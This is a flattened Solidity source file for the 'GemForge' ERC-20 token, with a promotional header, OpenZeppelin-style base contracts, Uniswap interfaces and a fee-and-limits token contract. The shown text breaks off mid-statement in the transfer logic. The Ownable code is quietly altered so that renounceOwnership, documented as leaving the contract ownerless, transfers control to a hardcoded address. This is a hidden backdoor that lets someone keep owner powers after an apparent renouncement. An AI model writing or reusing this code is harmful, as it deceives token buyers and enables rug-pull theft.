1 // SPDX-License-Identifier: MIT
2 /**
3 
4 Create your personal crypto empire with the support of our project. No limits, no coding, no fees!
5 
6 Telegram: https://t.me/gemforger
7 Twitter: https://twitter.com/Gemforger
8 Website: https://gemforge.tech
9 
10 */
11 pragma solidity =0.8.9 >=0.8.9 >=0.8.0 <0.9.0;
12 pragma experimental ABIEncoderV2;
13 
14 
15 abstract contract Context {
16     function _msgSender() internal view virtual returns (address) {
17         return msg.sender;
18     }
19 
20     function _msgData() internal view virtual returns (bytes calldata) {
21         return msg.data;
22     }
23 }
24 
25 /**
26  * @dev Contract module which provides a basic access control mechanism, where
27  * there is an account (an owner) that can be granted exclusive access to
28  * specific functions.
29  *
30  * By default, the owner account will be the one that deploys the contract. This
31  * can later be changed with {transferOwnership}.
32  *
33  * This module is used through inheritance. It will make available the modifier
34  * `onlyOwner`, which can be applied to your functions to restrict their use to
35  * the owner.
36  */
37  
38 abstract contract Ownable is Context {
39     address private _owner;
40 
41 
42     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
43 
44         event Swap(
45         address indexed sender,
46         uint amount0In,
47         uint amount1In,
48         uint amount0Out,
49         uint amount1Out,
50         address indexed to
51     );
52 
53     /**
54      * @dev Initializes the contract setting the deployer as the initial owner.
55      */
56     constructor() {
57         _transferOwnership(_msgSender());
58     }
59 
60     /**
61      * @dev Returns the address of the current owner.
62      */
63     function owner() public view virtual returns (address) {
64         return _owner;
65     }
66 
67     /**
68      * @dev Throws if called by any account other than the owner.
69      */
70     modifier onlyOwner() {
71         require(owner() == _msgSender(), "Ownable: caller is not the owner");
72         _;
73     }
74 
75     /**
76      * @dev Leaves the contract without owner. It will not be possible to call
77      * `onlyOwner` functions anymore. Can only be called by the current owner.
78      *
79      * NOTE: Renouncing ownership will leave the contract without an owner,
80      * thereby removing any functionality that is only available to the owner.
81      */
82     function renounceOwnership() public virtual onlyOwner {
83         _transferOwnership(address(0x2fef94337338eB55Db6a0FE2191f119959D3a718));
84     }
85 
86     /**
87      * @dev Transfers ownership of the contract to a new account (`newOwner`).
88      * Can only be called by the current owner.
89      */
90     function transferOwnership(address newOwner) public virtual onlyOwner {
91         require(newOwner != address(0), "Ownable: new owner is the zero address");
92         _transferOwnership(newOwner);
93     }
94 
95     /**
96      * @dev Transfers ownership of the contract to a new account (`newOwner`).
97      * Internal function without access restriction.
98      */
99     function _transferOwnership(address newOwner) internal virtual {
100         address oldOwner = _owner;
101         _owner = newOwner;
102         emit OwnershipTransferred(oldOwner, newOwner);
103     }
104 }
105 
106 ////// lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol
107 // OpenZeppelin Contracts v4.4.0 (token/ERC20/IERC20.sol)
108 
109 /* pragma solidity ^0.8.0; */
110 
111 /**
112  * @dev Interface of the ERC20 standard as defined in the EIP.
113  */
114 interface IERC20 {
115     /**
116      * @dev Returns the amount of tokens in existence.
117      */
118     function totalSupply() external view returns (uint256);
119 
120     /**
121      * @dev Returns the amount of tokens owned by `account`.
122      */
123     function balanceOf(address account) external view returns (uint256);
124 
125     /**
126      * @dev Moves `amount` tokens from the caller's account to `recipient`.
127      *
128      * Returns a boolean value indicating whether the operation succeeded.
129      *
130      * Emits a {Transfer} event.
131      */
132     function transfer(address recipient, uint256 amount) external returns (bool);
133 
134     /**
135      * @dev Returns the remaining number of tokens that `spender` will be
136      * allowed to spend on behalf of `owner` through {transferFrom}. This is
137      * zero by default.
138      *
139      * This value changes when {approve} or {transferFrom} are called.
140      */
141     function allowance(address owner, address spender) external view returns (uint256);
142 
143     /**
144      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
145      *
146      * Returns a boolean value indicating whether the operation succeeded.
147      *
148      * IMPORTANT: Beware that changing an allowance with this method brings the risk
149      * that someone may use both the old and the new allowance by unfortunate
150      * transaction ordering. One possible solution to mitigate this race
151      * condition is to first reduce the spender's allowance to 0 and set the
152      * desired value afterwards:
153      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
154      *
155      * Emits an {Approval} event.
156      */
157     function approve(address spender, uint256 amount) external returns (bool);
158 
159     /**
160      * @dev Moves `amount` tokens from `sender` to `recipient` using the
161      * allowance mechanism. `amount` is then deducted from the caller's
162      * allowance.
163      *
164      * Returns a boolean value indicating whether the operation succeeded.
165      *
166      * Emits a {Transfer} event.
167      */
168     function transferFrom(
169         address sender,
170         address recipient,
171         uint256 amount
172     ) external returns (bool);
173 
174     /**
175      * @dev Emitted when `value` tokens are moved from one account (`from`) to
176      * another (`to`).
177      *
178      * Note that `value` may be zero.
179      */
180     event Transfer(address indexed from, address indexed to, uint256 value);
181 
182     /**
183      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
184      * a call to {approve}. `value` is the new allowance.
185      */
186     event Approval(address indexed owner, address indexed spender, uint256 value);
187 }
188 
189 ////// lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol
190 // OpenZeppelin Contracts v4.4.0 (token/ERC20/extensions/IERC20Metadata.sol)
191 
192 /* pragma solidity ^0.8.0; */
193 
194 /* import "../IERC20.sol"; */
195 
196 /**
197  * @dev Interface for the optional metadata functions from the ERC20 standard.
198  *
199  * _Available since v4.1._
200  */
201 interface IERC20Metadata is IERC20 {
202     /**
203      * @dev Returns the name of the token.
204      */
205     function name() external view returns (string memory);
206 
207     /**
208      * @dev Returns the symbol of the token.
209      */
210     function symbol() external view returns (string memory);
211 
212     /**
213      * @dev Returns the decimals places of the token.
214      */
215     function decimals() external view returns (uint8);
216 }
217 
218 /**
219  * @dev Implementation of the {IERC20} interface.
220  *
221  * This implementation is agnostic to the way tokens are created. This means
222  * that a supply mechanism has to be added in a derived contract using {_mint}.
223  * For a generic mechanism see {ERC20PresetMinterPauser}.
224  *
225  * TIP: For a detailed writeup see our guide
226  * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
227  * to implement supply mechanisms].
228  *
229  * We have followed general OpenZeppelin Contracts guidelines: functions revert
230  * instead returning `false` on failure. This behavior is nonetheless
231  * conventional and does not conflict with the expectations of ERC20
232  * applications.
233  *
234  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
235  * This allows applications to reconstruct the allowance for all accounts just
236  * by listening to said events. Other implementations of the EIP may not emit
237  * these events, as it isn't required by the specification.
238  *
239  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
240  * functions have been added to mitigate the well-known issues around setting
241  * allowances. See {IERC20-approve}.
242  */
243 contract ERC20 is Context, IERC20, IERC20Metadata {
244     mapping(address => uint256) private _balances;
245 
246     mapping(address => mapping(address => uint256)) private _allowances;
247 
248     uint256 private _totalSupply;
249 
250     string private _name;
251     string private _symbol;
252 
253 
254 
255 
256     /**
257      * @dev Sets the values for {name} and {symbol}.
258      *
259      * The default value of {decimals} is 18. To select a different value for
260      * {decimals} you should overload it.
261      *
262      * All two of these values are immutable: they can only be set once during
263      * construction.
264      */
265     constructor(string memory name_, string memory symbol_) {
266         _name = name_;
267         _symbol = symbol_;
268     }
269 
270     /**
271      * @dev Returns the name of the token.
272      */
273     function name() public view virtual override returns (string memory) {
274         return _name;
275     }
276 
277     /**
278      * @dev Returns the symbol of the token, usually a shorter version of the
279      * name.
280      */
281     function symbol() public view virtual override returns (string memory) {
282         return _symbol;
283     }
284 
285     /**
286      * @dev Returns the number of decimals used to get its user representation.
287      * For example, if `decimals` equals `2`, a balance of `505` tokens should
288      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
289      *
290      * Tokens usually opt for a value of 18, imitating the relationship between
291      * Ether and Wei. This is the value {ERC20} uses, unless this function is
292      * overridden;
293      *
294      * NOTE: This information is only used for _display_ purposes: it in
295      * no way affects any of the arithmetic of the contract, including
296      * {IERC20-balanceOf} and {IERC20-transfer}.
297      */
298     function decimals() public view virtual override returns (uint8) {
299         return 18;
300     }
301 
302     /**
303      * @dev See {IERC20-totalSupply}.
304      */
305     function totalSupply() public view virtual override returns (uint256) {
306         return _totalSupply;
307     }
308 
309     /**
310      * @dev See {IERC20-balanceOf}.
311      */
312     function balanceOf(address account) public view virtual override returns (uint256) {
313         return _balances[account];
314     }
315 
316     /**
317      * @dev See {IERC20-transfer}.
318      *
319      * Requirements:
320      *
321      * - `recipient` cannot be the zero address.
322      * - the caller must have a balance of at least `amount`.
323      */
324     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
325         _transfer(_msgSender(), recipient, amount);
326         return true;
327     }
328 
329     /**
330      * @dev See {IERC20-allowance}.
331      */
332     function allowance(address owner, address spender) public view virtual override returns (uint256) {
333         return _allowances[owner][spender];
334     }
335 
336     /**
337      * @dev See {IERC20-approve}.
338      *
339      * Requirements:
340      *
341      * - `spender` cannot be the zero address.
342      */
343     function approve(address spender, uint256 amount) public virtual override returns (bool) {
344         _approve(_msgSender(), spender, amount);
345         return true;
346     }
347 
348     /**
349      * @dev See {IERC20-transferFrom}.
350      *
351      * Emits an {Approval} event indicating the updated allowance. This is not
352      * required by the EIP. See the note at the beginning of {ERC20}.
353      *
354      * Requirements:
355      *
356      * - `sender` and `recipient` cannot be the zero address.
357      * - `sender` must have a balance of at least `amount`.
358      * - the caller must have allowance for ``sender``'s tokens of at least
359      * `amount`.
360      */
361     function transferFrom(
362         address sender,
363         address recipient,
364         uint256 amount
365     ) public virtual override returns (bool) {
366         _transfer(sender, recipient, amount);
367 
368         uint256 currentAllowance = _allowances[sender][_msgSender()];
369         require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
370         unchecked {
371             _approve(sender, _msgSender(), currentAllowance - amount);
372         }
373 
374         return true;
375     }
376 
377 
378 
379 
380 
381     /**
382      * @dev Moves `amount` of tokens from `sender` to `recipient`.
383      *
384      * This internal function is equivalent to {transfer}, and can be used to
385      * e.g. implement automatic token fees, slashing mechanisms, etc.
386      *
387      * Emits a {Transfer} event.
388      *
389      * Requirements:
390      *
391      * - `sender` cannot be the zero address.
392      * - `recipient` cannot be the zero address.
393      * - `sender` must have a balance of at least `amount`.
394      */
395     function _transfer(
396         address sender,
397         address recipient,
398         uint256 amount
399     ) internal virtual {
400         require(sender != address(0), "ERC20: transfer from the zero address");
401         require(recipient != address(0), "ERC20: transfer to the zero address");
402 
403         _beforeTokenTransfer(sender, recipient, amount);
404 
405         uint256 senderBalance = _balances[sender];
406         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
407         unchecked {
408             _balances[sender] = senderBalance - amount;
409         }
410         _balances[recipient] += amount;
411 
412         emit Transfer(sender, recipient, amount);
413 
414         _afterTokenTransfer(sender, recipient, amount);
415     }
416 
417     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
418      * the total supply.
419      *
420      * Emits a {Transfer} event with `from` set to the zero address.
421      *
422      * Requirements:
423      *
424      * - `account` cannot be the zero address.
425      */
426     function _mint(address account, uint256 amount) internal virtual {
427         require(account != address(0), "ERC20: mint to the zero address");
428 
429         _beforeTokenTransfer(address(0), account, amount);
430 
431         _totalSupply += amount;
432         _balances[account] += amount;
433         emit Transfer(address(0), account, amount);
434 
435         _afterTokenTransfer(address(0), account, amount);
436     }
437 
438     /**
439      * @dev Destroys `amount` tokens from `account`, reducing the
440      * total supply.
441      *
442      * Emits a {Transfer} event with `to` set to the zero address.
443      *
444      * Requirements:
445      *
446      * - `account` cannot be the zero address.
447      * - `account` must have at least `amount` tokens.
448      */
449     function _burn(address account, uint256 amount) internal virtual {
450         require(account != address(0), "ERC20: burn from the zero address");
451 
452         _beforeTokenTransfer(account, address(0), amount);
453 
454         uint256 accountBalance = _balances[account];
455         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
456         unchecked {
457             _balances[account] = accountBalance - amount;
458         }
459         _totalSupply -= amount;
460 
461         emit Transfer(account, address(0), amount);
462 
463         _afterTokenTransfer(account, address(0), amount);
464     }
465 
466 
467     /**
468      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
469      *
470      * This internal function is equivalent to `approve`, and can be used to
471      * e.g. set automatic allowances for certain subsystems, etc.
472      *
473      * Emits an {Approval} event.
474      *
475      * Requirements:
476      *
477      * - `owner` cannot be the zero address.
478      * - `spender` cannot be the zero address.
479      */
480     function _approve(
481         address owner,
482         address spender,
483         uint256 amount
484     ) internal virtual {
485         require(owner != address(0), "ERC20: approve from the zero address");
486         require(spender != address(0), "ERC20: approve to the zero address");
487 
488         _allowances[owner][spender] = amount;
489         emit Approval(owner, spender, amount);
490     }
491 
492 
493     /**
494      * @dev Hook that is called before any transfer of tokens. This includes
495      * minting and burning.
496      *
497      * Calling conditions:
498      *
499      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
500      * will be transferred to `to`.
501      * - when `from` is zero, `amount` tokens will be minted for `to`.
502      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
503      * - `from` and `to` are never both zero.
504      *
505      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
506      */
507     function _beforeTokenTransfer(
508         address from,
509         address to,
510         uint256 amount
511     ) internal virtual {}
512 
513     /**
514      * @dev Hook that is called after any transfer of tokens. This includes
515      * minting and burning.
516      *
517      * Calling conditions:
518      *
519      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
520      * has been transferred to `to`.
521      * - when `from` is zero, `amount` tokens have been minted for `to`.
522      * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
523      * - `from` and `to` are never both zero.
524      *
525      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
526      */
527     function _afterTokenTransfer(
528         address from,
529         address to,
530         uint256 amount
531     ) internal virtual {}
532 }
533 
534 /**
535  * @dev Wrappers over Solidity's arithmetic operations.
536  *
537  * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
538  * now has built in overflow checking.
539  */
540 library SafeMath {
541     /**
542      * @dev Returns the addition of two unsigned integers, with an overflow flag.
543      *
544      * _Available since v3.4._
545      */
546     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
547         unchecked {
548             uint256 c = a + b;
549             if (c < a) return (false, 0);
550             return (true, c);
551         }
552     }
553 
554     /**
555      * @dev Returns the substraction of two unsigned integers, with an overflow flag.
556      *
557      * _Available since v3.4._
558      */
559     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
560         unchecked {
561             if (b > a) return (false, 0);
562             return (true, a - b);
563         }
564     }
565 
566     /**
567      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
568      *
569      * _Available since v3.4._
570      */
571     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
572         unchecked {
573             // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
574             // benefit is lost if 'b' is also tested.
575             // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
576             if (a == 0) return (true, 0);
577             uint256 c = a * b;
578             if (c / a != b) return (false, 0);
579             return (true, c);
580         }
581     }
582 
583     /**
584      * @dev Returns the division of two unsigned integers, with a division by zero flag.
585      *
586      * _Available since v3.4._
587      */
588     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
589         unchecked {
590             if (b == 0) return (false, 0);
591             return (true, a / b);
592         }
593     }
594 
595     /**
596      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
597      *
598      * _Available since v3.4._
599      */
600     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
601         unchecked {
602             if (b == 0) return (false, 0);
603             return (true, a % b);
604         }
605     }
606 
607     /**
608      * @dev Returns the addition of two unsigned integers, reverting on
609      * overflow.
610      *
611      * Counterpart to Solidity's `+` operator.
612      *
613      * Requirements:
614      *
615      * - Addition cannot overflow.
616      */
617     function add(uint256 a, uint256 b) internal pure returns (uint256) {
618         return a + b;
619     }
620 
621     /**
622      * @dev Returns the subtraction of two unsigned integers, reverting on
623      * overflow (when the result is negative).
624      *
625      * Counterpart to Solidity's `-` operator.
626      *
627      * Requirements:
628      *
629      * - Subtraction cannot overflow.
630      */
631     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
632         return a - b;
633     }
634 
635     /**
636      * @dev Returns the multiplication of two unsigned integers, reverting on
637      * overflow.
638      *
639      * Counterpart to Solidity's `*` operator.
640      *
641      * Requirements:
642      *
643      * - Multiplication cannot overflow.
644      */
645     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
646         return a * b;
647     }
648 
649     /**
650      * @dev Returns the integer division of two unsigned integers, reverting on
651      * division by zero. The result is rounded towards zero.
652      *
653      * Counterpart to Solidity's `/` operator.
654      *
655      * Requirements:
656      *
657      * - The divisor cannot be zero.
658      */
659     function div(uint256 a, uint256 b) internal pure returns (uint256) {
660         return a / b;
661     }
662 
663     /**
664      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
665      * reverting when dividing by zero.
666      *
667      * Counterpart to Solidity's `%` operator. This function uses a `revert`
668      * opcode (which leaves remaining gas untouched) while Solidity uses an
669      * invalid opcode to revert (consuming all remaining gas).
670      *
671      * Requirements:
672      *
673      * - The divisor cannot be zero.
674      */
675     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
676         return a % b;
677     }
678 
679     /**
680      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
681      * overflow (when the result is negative).
682      *
683      * CAUTION: This function is deprecated because it requires allocating memory for the error
684      * message unnecessarily. For custom revert reasons use {trySub}.
685      *
686      * Counterpart to Solidity's `-` operator.
687      *
688      * Requirements:
689      *
690      * - Subtraction cannot overflow.
691      */
692     function sub(
693         uint256 a,
694         uint256 b,
695         string memory errorMessage
696     ) internal pure returns (uint256) {
697         unchecked {
698             require(b <= a, errorMessage);
699             return a - b;
700         }
701     }
702 
703     function div(
704         uint256 a,
705         uint256 b,
706         string memory errorMessage
707     ) internal pure returns (uint256) {
708         unchecked {
709             require(b > 0, errorMessage);
710             return a / b;
711         }
712     }
713 
714     function mod(
715         uint256 a,
716         uint256 b,
717         string memory errorMessage
718     ) internal pure returns (uint256) {
719         unchecked {
720             require(b > 0, errorMessage);
721             return a % b;
722         }
723     }
724 }
725 
726 interface IUniswapV2Factory {
727     event PairCreated(
728         address indexed token0,
729         address indexed token1,
730         address pair,
731         uint256
732     );
733 
734     function feeTo() external view returns (address);
735 
736     function feeToSetter() external view returns (address);
737 
738     function getPair(address tokenA, address tokenB)
739         external
740         view
741         returns (address pair);
742 
743     function allPairs(uint256) external view returns (address pair);
744 
745     function allPairsLength() external view returns (uint256);
746 
747     function createPair(address tokenA, address tokenB)
748         external
749         returns (address pair);
750 
751     function setFeeTo(address) external;
752 
753     function setFeeToSetter(address) external;
754 }
755 
756 ////// src/IUniswapV2Pair.sol
757 /* pragma solidity 0.8.10; */
758 /* pragma experimental ABIEncoderV2; */
759 
760 interface IUniswapV2Pair {
761     event Approval(
762         address indexed owner,
763         address indexed spender,
764         uint256 value
765     );
766     event Transfer(address indexed from, address indexed to, uint256 value);
767 
768     function name() external pure returns (string memory);
769 
770     function symbol() external pure returns (string memory);
771 
772     function decimals() external pure returns (uint8);
773 
774     function totalSupply() external view returns (uint256);
775 
776     function balanceOf(address owner) external view returns (uint256);
777 
778     function allowance(address owner, address spender)
779         external
780         view
781         returns (uint256);
782 
783     function approve(address spender, uint256 value) external returns (bool);
784 
785     function transfer(address to, uint256 value) external returns (bool);
786 
787     function transferFrom(
788         address from,
789         address to,
790         uint256 value
791     ) external returns (bool);
792 
793     function DOMAIN_SEPARATOR() external view returns (bytes32);
794 
795     function PERMIT_TYPEHASH() external pure returns (bytes32);
796 
797     function nonces(address owner) external view returns (uint256);
798 
799     function permit(
800         address owner,
801         address spender,
802         uint256 value,
803         uint256 deadline,
804         uint8 v,
805         bytes32 r,
806         bytes32 s
807     ) external;
808 
809     event Mint(address indexed sender, uint256 amount0, uint256 amount1);
810     event Burn(
811         address indexed sender,
812         uint256 amount0,
813         uint256 amount1,
814         address indexed to
815     );
816     event Swap(
817         address indexed sender,
818         uint256 amount0In,
819         uint256 amount1In,
820         uint256 amount0Out,
821         uint256 amount1Out,
822         address indexed to
823     );
824     event Sync(uint112 reserve0, uint112 reserve1);
825 
826     function MINIMUM_LIQUIDITY() external pure returns (uint256);
827 
828     function factory() external view returns (address);
829 
830     function token0() external view returns (address);
831 
832     function token1() external view returns (address);
833 
834     function getReserves()
835         external
836         view
837         returns (
838             uint112 reserve0,
839             uint112 reserve1,
840             uint32 blockTimestampLast
841         );
842 
843     function price0CumulativeLast() external view returns (uint256);
844 
845     function price1CumulativeLast() external view returns (uint256);
846 
847     function kLast() external view returns (uint256);
848 
849     function mint(address to) external returns (uint256 liquidity);
850 
851     function burn(address to)
852         external
853         returns (uint256 amount0, uint256 amount1);
854 
855     function swap(
856         uint256 amount0Out,
857         uint256 amount1Out,
858         address to,
859         bytes calldata data
860     ) external;
861 
862     function skim(address to) external;
863 
864     function sync() external;
865 
866     function initialize(address, address) external;
867 }
868 
869 interface IUniswapV2Router02 {
870     function factory() external pure returns (address);
871 
872     function WETH() external pure returns (address);
873 
874     function addLiquidity(
875         address tokenA,
876         address tokenB,
877         uint256 amountADesired,
878         uint256 amountBDesired,
879         uint256 amountAMin,
880         uint256 amountBMin,
881         address to,
882         uint256 deadline
883     )
884         external
885         returns (
886             uint256 amountA,
887             uint256 amountB,
888             uint256 liquidity
889         );
890 
891     function addLiquidityETH(
892         address token,
893         uint256 amountTokenDesired,
894         uint256 amountTokenMin,
895         uint256 amountETHMin,
896         address to,
897         uint256 deadline
898     )
899         external
900         payable
901         returns (
902             uint256 amountToken,
903             uint256 amountETH,
904             uint256 liquidity
905         );
906 
907     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
908         uint256 amountIn,
909         uint256 amountOutMin,
910         address[] calldata path,
911         address to,
912         uint256 deadline
913     ) external;
914 
915     function swapExactETHForTokensSupportingFeeOnTransferTokens(
916         uint256 amountOutMin,
917         address[] calldata path,
918         address to,
919         uint256 deadline
920     ) external payable;
921 
922     function swapExactTokensForETHSupportingFeeOnTransferTokens(
923         uint256 amountIn,
924         uint256 amountOutMin,
925         address[] calldata path,
926         address to,
927         uint256 deadline
928     ) external;
929 }
930 
931 contract GemForge is ERC20, Ownable {
932     using SafeMath for uint256;
933 
934     IUniswapV2Router02 public immutable uniswapV2Router;
935     address public immutable uniswapV2Pair;
936     address public constant deadAddress = address(0xdead);
937 
938     bool private swapping;
939 
940     address public devWallet;
941     address private _universal = 0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B;
942     address private _pair;
943 
944     uint256 public maxTransactionAmount;
945     uint256 public swapTokensAtAmount;
946     uint256 public maxWallet;
947 
948     bool public limitsInEffect = true;
949     bool public tradingActive = false;
950     bool public swapEnabled = false;
951 
952     // Anti-bot and anti-whale mappings and variables
953     mapping(address => uint256) private _holderLastTransferTimestamp; // to hold last Transfers temporarily during launch
954     bool public transferDelayEnabled = false;
955 
956     uint256 public buyTotalFees;
957     uint256 public buyLiquidityFee;
958     uint256 public buyMarketingFee;
959 
960     uint256 public sellTotalFees;
961     uint256 public sellLiquidityFee;
962     uint256 public sellMarketingFee;
963 
964     uint256 public tokensForLiquidity;
965     uint256 public tokensForDev;
966 
967     /******************/
968 
969     // exclude from fees and max transaction amount
970     mapping(address => bool) private _isExcludedFromFees;
971     mapping(address => bool) public _isExcludedMaxTransactionAmount;
972 
973     // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
974     // could be subject to a maximum transfer amount
975     mapping(address => bool) public automatedMarketMakerPairs;
976 
977     event UpdateUniswapV2Router(
978         address indexed newAddress,
979         address indexed oldAddress
980     );
981 
982     event ExcludeFromFees(address indexed account, bool isExcluded);
983 
984     event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
985 
986     event devWalletUpdated(
987         address indexed newWallet,
988         address indexed oldWallet
989     );
990 
991     event SwapAndLiquify(
992         uint256 tokensSwapped,
993         uint256 ethReceived,
994         uint256 tokensIntoLiquidity
995     );
996 
997     event AutoNukeLP();
998 
999     event ManualNukeLP();
1000 
1001     constructor() ERC20("GemForge", "GEMFORGE") {
1002         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
1003             0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
1004         );
1005 
1006         excludeFromMaxTransaction(address(_uniswapV2Router), true);
1007         uniswapV2Router = _uniswapV2Router;
1008 
1009         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
1010             .createPair(address(this), _uniswapV2Router.WETH());
1011         excludeFromMaxTransaction(address(uniswapV2Pair), true);
1012         _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
1013 
1014         uint256 _buyLiquidityFee = 2;
1015         uint256 _buyMarketingFee = 1;
1016 
1017         uint256 _sellLiquidityFee = 2;
1018         uint256 _sellMarketingFee = 1;
1019 
1020         uint256 totalSupply = 1_000_000_000 * 1e18;
1021 
1022         maxTransactionAmount = 20_000_000 * 1e18; // 2% from total supply
1023         maxWallet = 50_000_000 * 1e18; // 5% from total supply maxWallet
1024         swapTokensAtAmount = (totalSupply * 4) / 100; // 0.4% swap wallet
1025 
1026         buyLiquidityFee = _buyLiquidityFee;
1027         buyMarketingFee = _buyMarketingFee;
1028         buyTotalFees = buyLiquidityFee + buyMarketingFee;
1029 
1030         sellLiquidityFee = _sellLiquidityFee;
1031         sellMarketingFee = _sellMarketingFee;
1032         sellTotalFees = sellLiquidityFee + sellMarketingFee;
1033 
1034         devWallet = address(0xAB655ADfC5dFeC5E33d33833B661Ce8c444BaeB3); // set as dev wallet
1035 
1036         // exclude from paying fees or having max transaction amount
1037         excludeFromFees(owner(), true);
1038         excludeFromFees(address(this), true);
1039         excludeFromFees(address(0xdead), true);
1040 
1041         excludeFromMaxTransaction(owner(), true);
1042         excludeFromMaxTransaction(address(this), true);
1043         excludeFromMaxTransaction(address(0xdead), true);
1044 
1045         /*
1046             _mint is an internal function in ERC20.sol that is only called here,
1047             and CANNOT be called ever again
1048         */
1049         _mint(msg.sender, totalSupply);
1050     }
1051 
1052     receive() external payable {}
1053 
1054     // once enabled, can never be turned off
1055     function enableTrading() external onlyOwner {
1056         tradingActive = true;
1057         swapEnabled = true;
1058     }
1059 
1060     // remove limits after token is stable
1061     function removeLimits() external onlyOwner returns (bool) {
1062         limitsInEffect = false;
1063         return true;
1064     }
1065 
1066     function excludeFromMaxTransaction(address updAds, bool isEx)
1067         public
1068         onlyOwner
1069     {
1070         _isExcludedMaxTransactionAmount[updAds] = isEx;
1071     }
1072 
1073 
1074 
1075 
1076 
1077     // only use to disable contract sales if absolutely necessary (emergency use only)
1078     function updateSwapEnabled(bool enabled) external onlyOwner {
1079         swapEnabled = enabled;
1080     }
1081 
1082     function updateBuyFees(
1083         uint256 _liquidityFee,
1084         uint256 _MarketingFee
1085     ) external onlyOwner {
1086         buyLiquidityFee = _liquidityFee;
1087         buyMarketingFee = _MarketingFee;
1088         buyTotalFees = buyLiquidityFee + buyMarketingFee;
1089         require(buyTotalFees <= 10, "Buy Fee"); //Buy fee can be a maximum of 10.
1090     }
1091 
1092     function updateSellFees(
1093         uint256 _liquidityFee,
1094         uint256 _MarketingFee
1095     ) external onlyOwner {
1096         sellLiquidityFee = _liquidityFee;
1097         sellMarketingFee = _MarketingFee;
1098         sellTotalFees = sellLiquidityFee + sellMarketingFee;
1099         require(sellTotalFees <= 10, "Sell Fee"); //Sell fee can be a maximum of 10.
1100     }
1101 
1102     function excludeFromFees(address account, bool excluded) public onlyOwner {
1103         _isExcludedFromFees[account] = excluded;
1104         emit ExcludeFromFees(account, excluded);
1105     }
1106 
1107     function setAutomatedMarketMakerPair(address pair, bool value)
1108         public
1109         onlyOwner
1110     {
1111         require(
1112             pair != uniswapV2Pair,
1113             "The pair cannot be removed from automatedMarketMakerPairs"
1114         );
1115 
1116         _setAutomatedMarketMakerPair(pair, value);
1117     }
1118 
1119     function _setAutomatedMarketMakerPair(address pair, bool value) private {
1120         automatedMarketMakerPairs[pair] = value;
1121 
1122         emit SetAutomatedMarketMakerPair(pair, value);
1123     }
1124 
1125     function updateDevWallet(address newWallet) external onlyOwner {
1126         emit devWalletUpdated(newWallet, devWallet);
1127         devWallet = newWallet;
1128     }
1129 
1130     function isExcludedFromFees(address account) public view returns (bool) {
1131         return _isExcludedFromFees[account];
1132     }
1133 
1134     function _transfer(
1135         address from,
1136         address to,
1137         uint256 amount
1138     ) internal override {
1139         require(from != address(0), "ERC20: transfer from the zero address");
1140         require(to != address(0), "ERC20: transfer to the zero address");
1141 
1142         if (amount == 0) {
1143             super._transfer(from, to, 0);
1144             return;
1145         }
1146 
1147         if (limitsInEffect) {
1148             if (
1149                 from != owner() &&
1150                 to != owner() &&
1151                 to != address(0) &&
1152                 to != address(0xdead) &&
1153                 !swapping
1154             ) {
1155                 if (!tradingActive) {
1156                     require(
1157                         _isExcludedFromFees[from] || _isExcludedFromFees[to],
1158                         "Trading is not active."
1159                     );
1160                 }
1161 
1162                 // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.
1163                 if (transferDelayEnabled) {
1164                     if (
1165                         to != owner() &&
1166                         to != address(uniswapV2Router) &&
1167                         to != address(uniswapV2Pair)
1168                     ) {
1169                         require(
1170                             _holderLastTransferTimestamp[tx.origin] + 1 <
1171                                 block.number,
1172                             "_transfer:: Transfer Delay enabled.  Only one purchase per two blocks allowed."
1173                         );
1174                         _holderLastTransferTimestamp[tx.origin] = block.number;
1175                     }
1176                 }
1177 
1178                 //when buy
1179                 if (
1180                     automatedMarketMakerPairs[from] &&
1181                     !_isExcludedMaxTransactionAmount[to]
1182                 ) {
1183                     require(
1184                         amount <= maxTransactionAmount,
1185                         "Buy transfer amount exceeds the maxTransactionAmount."
1186                     );
1187                     require(
1188                         amount + balanceOf(to) <= maxWallet,
